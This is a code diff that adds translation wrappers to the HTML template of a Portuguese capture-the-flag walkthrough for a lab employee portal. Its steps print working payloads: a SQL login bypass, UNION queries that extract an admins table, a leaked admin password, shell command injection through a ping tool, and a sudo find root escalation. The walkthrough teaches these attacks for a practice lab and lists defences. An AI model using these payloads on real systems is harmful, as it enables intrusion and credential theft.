@@ -2,7 +2,7 @@
         <i class="nf nf-md-book_open_variant wt-header-icon" aria-hidden="true"></i>
         <div class="wt-header-info">
           <span class="wt-header-kicker">{{ challenge.category | upper }}</span>
-          <h1 class="wt-title">Alpha — SQLi Basics: Guia Definitivo</h1>
+          <h1 class="wt-title">{{ _('Alpha — SQLi Basics: Guia Definitivo') }}</h1>
           <p class="wt-intro">
             Bem-vindo(a) ao seu primeiro ataque real! Sua missão é invadir o <strong>EverSec Employee Portal</strong> e capturar as 5 flags até o root. Siga o passo a passo investigativo abaixo.
           </p>
@@ -13,7 +13,7 @@
       <section class="wt-step" id="step-0" data-step-index="0">
         <div class="wt-step-number">0</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Parte 0 — Entendendo o Terreno Antes de Atacar</h3>
+          <h3 class="wt-step-title">{{ _('Parte 0 — Entendendo o Terreno Antes de Atacar') }}</h3>
           <p>
             Antes de sair disparando payloads, um bom hacker entende a superfície de ataque. O <strong>EverSec Employee Portal</strong> roda sob demanda na porta designada e possui os seguintes componentes:
           </p>
@@ -25,10 +25,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-lock" aria-hidden="true"></i> Login (/login)
                 </span>
-                <span class="wt-surface-tag tag-admin">FLAG 1 (SQLi Bypass)</span>
+                <span class="wt-surface-tag tag-admin">{{ _('FLAG 1 (SQLi Bypass)') }}</span>
               </div>
               <div class="wt-surface-body">
-                Autentica colaboradores e funcionários no portal.
+                {{ _('Autentica colaboradores e funcionários no portal.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-database_alert" aria-hidden="true"></i>
@@ -42,10 +42,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-magnify" aria-hidden="true"></i> Search (/search)
                 </span>
-                <span class="wt-surface-tag tag-jwt">FLAGS 2 & 3 (UNION SQLi)</span>
+                <span class="wt-surface-tag tag-jwt">{{ _('FLAGS 2 & 3 (UNION SQLi)') }}</span>
               </div>
               <div class="wt-surface-body">
-                Busca registros e informações de colaboradores no banco SQLite.
+                {{ _('Busca registros e informações de colaboradores no banco SQLite.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-database_search" aria-hidden="true"></i>
@@ -59,10 +59,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-crown" aria-hidden="true"></i> Admin Panel (/admin)
                 </span>
-                <span class="wt-surface-tag tag-ssti">FLAG 4 (Reuso de Senha)</span>
+                <span class="wt-surface-tag tag-ssti">{{ _('FLAG 4 (Reuso de Senha)') }}</span>
               </div>
               <div class="wt-surface-body">
-                Painel restrito a administradores para gestão de ferramentas de suporte.
+                {{ _('Painel restrito a administradores para gestão de ferramentas de suporte.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-key" aria-hidden="true"></i>
@@ -76,10 +76,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-access_point" aria-hidden="true"></i> Ping Tool (/admin/tools/ping)
                 </span>
-                <span class="wt-surface-tag tag-root">FLAG 5 ROOT (RCE)</span>
+                <span class="wt-surface-tag tag-root">{{ _('FLAG 5 ROOT (RCE)') }}</span>
               </div>
               <div class="wt-surface-body">
-                Utilitário administrativo de diagnóstico de conectividade de rede.
+                {{ _('Utilitário administrativo de diagnóstico de conectividade de rede.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-terminal" aria-hidden="true"></i>
@@ -93,11 +93,11 @@
             <div>
               <strong>O que é SQL Injection?</strong>
               <p>
-                SQLi acontece quando dados de entrada do usuário são concatenados diretamente na query sem validação ou sanitização:
+                {{ _('SQLi acontece quando dados de entrada do usuário são concatenados diretamente na query sem validação ou sanitização:') }}
               </p>
               <div class="wt-code-block" style="margin-top: 8px;">
                 <div class="wt-code-header">
-                  <span class="wt-code-prompt">Python (Vulnerável):</span>
+                  <span class="wt-code-prompt">{{ _('Python (Vulnerável):') }}</span>
                   <code>query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"</code>
                 </div>
               </div>
@@ -111,12 +111,12 @@
       <section class="wt-step" id="step-1" data-step-index="1">
         <div class="wt-step-number">1</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 1 — Reconhecimento (Recon)</h3>
-          <p>Inicie a máquina pelo card ou botão lateral e acesse a URL do laboratório ativo. Inspecione os formulários, rotas públicas e cabeçalhos HTTP.</p>
+          <h3 class="wt-step-title">{{ _('Etapa 1 — Reconhecimento (Recon)') }}</h3>
+          <p>{{ _('Inicie a máquina pelo card ou botão lateral e acesse a URL do laboratório ativo. Inspecione os formulários, rotas públicas e cabeçalhos HTTP.') }}</p>
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Terminal:</span>
+              <span class="wt-code-prompt">{{ _('Terminal:') }}</span>
               <code>curl -I http://10.10.15.11:5001</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -137,14 +137,14 @@
       <section class="wt-step" id="step-2" data-step-index="2">
         <div class="wt-step-number">2</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 2 — Bypass de Autenticação (FLAG 1)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 2 — Bypass de Autenticação (FLAG 1)') }}</h3>
           <p>
-            No formulário de login principal, vamos quebrar a lógica de validação de senha utilizando o payload clássico de injeção SQL booleana.
+            {{ _('No formulário de login principal, vamos quebrar a lógica de validação de senha utilizando o payload clássico de injeção SQL booleana.') }}
           </p>
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Campo Username:</span>
+              <span class="wt-code-prompt">{{ _('Campo Username:') }}</span>
               <code>admin' OR '1'='1</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -154,7 +154,7 @@
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Campo Password:</span>
+              <span class="wt-code-prompt">{{ _('Campo Password:') }}</span>
               <code>qualquer_coisa</code>
             </div>
           </div>
@@ -178,7 +178,7 @@
       <section class="wt-step" id="step-3" data-step-index="3">
         <div class="wt-step-number">3</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 3 — Extração de Dados com UNION (FLAG 2)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 3 — Extração de Dados com UNION (FLAG 2)') }}</h3>
           <p>
             No User Dashboard autenticado, utilize o campo de busca (<strong>User Search</strong>) para exfiltrar a tabela administrativa do banco de dados SQLite.
           </p>
@@ -186,7 +186,7 @@
           <p><strong>Subetapa 3.1 — Descobrindo o número de colunas:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Search:</span>
+              <span class="wt-code-prompt">{{ _('Search:') }}</span>
               <code>' UNION SELECT 1,2,3 --</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -197,7 +197,7 @@
           <p><strong>Subetapa 3.2 — Mapeando as tabelas com sqlite_master:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Search:</span>
+              <span class="wt-code-prompt">{{ _('Search:') }}</span>
               <code>' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' --</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -209,7 +209,7 @@
           <p><strong>Subetapa 3.3 — Extraindo as credenciais da tabela admins:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Search:</span>
+              <span class="wt-code-prompt">{{ _('Search:') }}</span>
               <code>' UNION SELECT id, username, password FROM admins --</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -231,14 +231,14 @@
       <section class="wt-step" id="step-4" data-step-index="4">
         <div class="wt-step-number">4</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 4 — Acesso ao Painel Admin (FLAG 3)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 4 — Acesso ao Painel Admin (FLAG 3)') }}</h3>
           <p>
             Navegue até a rota administrativa do alvo: <code>/admin</code>. Aqui podemos aplicar <em>Credential Reuse</em> (usando a senha roubada da etapa anterior) ou efetuar novo bypass SQL.
           </p>
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Login Admin:</span>
+              <span class="wt-code-prompt">{{ _('Login Admin:') }}</span>
               <code>Username: admin | Password: un10n_d4t4_3xtr4ct</code>
               <button type="button" class="wt-copy-btn" data-copy="admin&#10;un10n_d4t4_3xtr4ct">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -260,7 +260,7 @@
       <section class="wt-step" id="step-5" data-step-index="5">
         <div class="wt-step-number">5</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 5 — Command Injection / RCE (FLAG 4)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 5 — Command Injection / RCE (FLAG 4)') }}</h3>
           <p>
             No painel admin, acesse a ferramenta de rede <strong>Ping Tool</strong>. O backend passa o input para o shell do host via <code>subprocess.check_output(f"ping -c 2 {host}", shell=True)</code> sem sanitização.
           </p>
@@ -268,7 +268,7 @@
           <p>Injete o separador de comandos <code>;</code> para executar instruções no sistema operacional:</p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Host to ping:</span>
+              <span class="wt-code-prompt">{{ _('Host to ping:') }}</span>
               <code>127.0.0.1; cat /home/ctfuser/flag4.txt</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -290,7 +290,7 @@
       <section class="wt-step" id="step-6" data-step-index="6">
         <div class="wt-step-number">6</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 6 — Escalada de Privilégios até Root (FLAG 5)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 6 — Escalada de Privilégios até Root (FLAG 5)') }}</h3>
           <p>
             Atualmente controlamos o shell como o usuário <code>ctfuser</code>. Para obter a flag final de root em <code>/root/flag5.txt</code>, precisamos elevar privilégios.
           </p>
@@ -298,7 +298,7 @@
           <p><strong>Subetapa 6.1 — Checando privilégios de sudo:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload Ping:</span>
+              <span class="wt-code-prompt">{{ _('Payload Ping:') }}</span>
               <code>127.0.0.1; sudo -l</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -310,7 +310,7 @@
           <p><strong>Subetapa 6.2 — Exploit GTFOBins com find -exec:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload Final:</span>
+              <span class="wt-code-prompt">{{ _('Payload Final:') }}</span>
               <code>127.0.0.1; sudo find /root -name flag5.txt -exec cat {} \;</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -332,12 +332,12 @@
       <section class="wt-step" id="step-7" data-step-index="7">
         <div class="wt-step-number"><i class="nf nf-md-lightning_bolt" aria-hidden="true"></i></div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Script Python Automatizado (solve.py)</h3>
-          <p>Script completo em Python vanilla pronto para executar e extrair todas as 5 flags em sequência:</p>
+          <h3 class="wt-step-title">{{ _('Script Python Automatizado (solve.py)') }}</h3>
+          <p>{{ _('Script completo em Python vanilla pronto para executar e extrair todas as 5 flags em sequência:') }}</p>
 
           <div class="wt-code-block">
             <div class="wt-code-header" style="justify-content: space-between;">
-              <span class="wt-code-prompt">Python 3 (solve.py):</span>
+              <span class="wt-code-prompt">{{ _('Python 3 (solve.py):') }}</span>
               <button type="button" class="wt-copy-btn" id="btn-copy-solve-script">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copiar Script Completo
               </button>
@@ -388,37 +388,37 @@ print("[+] Todas as 5 flags capturadas com sucesso!")</code></pre>
       <section class="wt-step" id="step-8" data-step-index="8">
         <div class="wt-step-number"><i class="nf nf-md-book_open_page_variant" aria-hidden="true"></i></div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Dicionário do Pentester & Melhores Práticas</h3>
-          <p>Termos fundamentais aplicados nesta exploração:</p>
+          <h3 class="wt-step-title">{{ _('Dicionário do Pentester & Melhores Práticas') }}</h3>
+          <p>{{ _('Termos fundamentais aplicados nesta exploração:') }}</p>
 
           <div class="wt-table-wrap">
             <table class="wt-clean-table">
               <thead>
                 <tr>
-                  <th>Termo</th>
-                  <th>Conceito</th>
-                  <th>Defesa Recomendada</th>
+                  <th>{{ _('Termo') }}</th>
+                  <th>{{ _('Conceito') }}</th>
+                  <th>{{ _('Defesa Recomendada') }}</th>
                 </tr>
               </thead>
               <tbody>
                 <tr>
                   <td><code>SQLi</code></td>
-                  <td>Concatenação indevida de dados do usuário em queries SQL</td>
-                  <td>Prepared Statements / Parametrização obrigatória</td>
+                  <td>{{ _('Concatenação indevida de dados do usuário em queries SQL') }}</td>
+                  <td>{{ _('Prepared Statements / Parametrização obrigatória') }}</td>
                 </tr>
                 <tr>
                   <td><code>UNION</code></td>
-                  <td>Operador que anexa registros de outra tabela ao resultado</td>
-                  <td>Sanitização de tipos e schemas restritos</td>
+                  <td>{{ _('Operador que anexa registros de outra tabela ao resultado') }}</td>
+                  <td>{{ _('Sanitização de tipos e schemas restritos') }}</td>
                 </tr>
                 <tr>
                   <td><code>RCE</code></td>
-                  <td>Execução remota de comandos no sistema operacional</td>
+                  <td>{{ _('Execução remota de comandos no sistema operacional') }}</td>
                   <td>Nunca usar <code>shell=True</code>; validar via lista de permitidos</td>
                 </tr>
                 <tr>
                   <td><code>GTFOBins</code></td>
-                  <td>Catálogo de binários de sistema exploráveis para PrivEsc</td>
+                  <td>{{ _('Catálogo de binários de sistema exploráveis para PrivEsc') }}</td>
                   <td>Restringir flags do <code>sudoers</code> com <code>NOEXEC</code></td>
                 </tr>
               </tbody>
